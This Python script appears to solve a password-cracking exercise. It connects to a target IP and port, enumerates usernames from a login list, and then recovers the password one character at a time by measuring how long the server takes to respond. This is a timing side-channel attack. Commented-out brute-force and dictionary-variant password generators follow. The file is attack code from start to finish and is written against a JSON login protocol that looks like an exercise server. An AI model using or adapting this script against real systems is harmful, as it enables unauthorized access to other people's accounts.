import sys
import socket
import string
import itertools
import json
from datetime import datetime


def gen_from_file(file):
    with open(file, 'r') as f:
        while True:
            yield f.readline().strip()


if __name__ == '__main__':
    gen_login = gen_from_file('logins.txt')
    args = sys.argv
    ip, port = args[1], args[2]

    with socket.socket() as s:
        s.connect((ip, int(port)))

        while True:
            login = next(gen_login)
            pair = json.dumps({"login": login, "password": " "})
            s.send(pair.encode())
            response = s.recv(1024).decode()
            result = json.loads(response)['result']
            if result != "Wrong login!":
                break

        password = ''
        symbols = string.ascii_lowercase + string.ascii_uppercase + string.digits
        while True:
            for char in symbols:
                password += char
                pair = json.dumps({"login": login, "password": password})

                start = datetime.now().microsecond
                s.send(pair.encode())
                response = s.recv(1024).decode()
                finish = datetime.now().microsecond
                diff_time = finish - start

                result = json.loads(response)['result']

                if result == "Wrong password!":
                    if diff_time < 90000:
                        password = password[:-1]
                elif result == "Exception happened during login":
                    break
                else:
                    break
            if result == "Connection success!":
                break
    print(pair)


# def gen_pass():
#     symbols = string.ascii_lowercase + string.digits
#     r_num = 1
#     while True:
#         comb = list(itertools.product(symbols, repeat=r_num))
#         for c in comb:
#             yield c
#         r_num += 1
#
#
# def gen_pass_from_dict():
#     with open('passwords.txt', 'r') as f:
#         while True:
#             password = f.readline()[:-1]
#             if password.isdigit():
#                 yield password
#             else:
#                 for p in itertools.product(*zip(password.lower(), password.upper())):
#                     yield ''.join(p)
